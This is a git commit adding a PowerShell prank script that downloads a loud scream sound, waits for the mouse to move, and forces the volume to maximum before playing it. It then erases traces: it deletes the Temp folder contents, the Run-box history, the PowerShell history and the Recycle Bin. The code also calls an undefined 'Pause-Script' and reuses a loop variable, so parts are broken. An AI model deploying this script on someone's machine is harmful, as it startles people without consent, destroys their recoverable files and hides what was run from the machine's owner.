5c689b548445ae7fba17c6f771ee14f95a5cf952
MajorMarmalade <106942782+MajorMarmalade@users.noreply.github.com>
2022-12-04 21:20:52 -0500

    Add files via upload

---
+++ loudsurpriseV2.ps1
@@ -0,0 +1,72 @@
+# Download WAV file; replace link to $wav to add your own sound
+
+$wav = "https://github.com/MajorMarmalade/Sounds/blob/main/hjkhjkhkhjkh-scream-(earrape)-By-Tuna.wav?raw=true"
+
+$w = -join($wav,"?dl=1")
+iwr $w -O $env:TMP\s.wav
+
+# Import the System.Windows.Forms assembly
+Add-Type -AssemblyName System.Windows.Forms
+
+# Store the original position of the cursor
+$originalPOS = [System.Windows.Forms.Cursor]::Position
+
+# Loop until the cursor position changes
+while (1) {
+    # Check if the cursor position has changed
+    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
+        # If the cursor has moved, exit the loop
+        break
+    }
+}
+
+# At this point, the script will continue executing
+
+function Play-WAV{
+$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
+}
+
+# This turns the volume up to max level
+
+# Set the number of times to repeat the command
+$numRepeats = 10
+
+# Use a for loop to repeat the command
+for ($i = 0; $i -lt $numRepeats; $i++) {
+  # Calculate the ceiling of 100 divided by 2
+  $k = [Math]::Ceiling(100/2)
+
+  # Create a new WScript.Shell object
+  $o = New-Object -ComObject WScript.Shell
+
+  # Use a for loop to send the [char] 175 keystroke $k times
+  for($i = 0; $i -lt $k; $i++) {
+    $o.SendKeys([char] 175)
+  }
+
+  # Wait for 2 seconds before continuing with the next repetition
+  Start-Sleep -Seconds 2
+}
+
+#plays audio file
+
+Pause-Script
+Play-WAV
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+
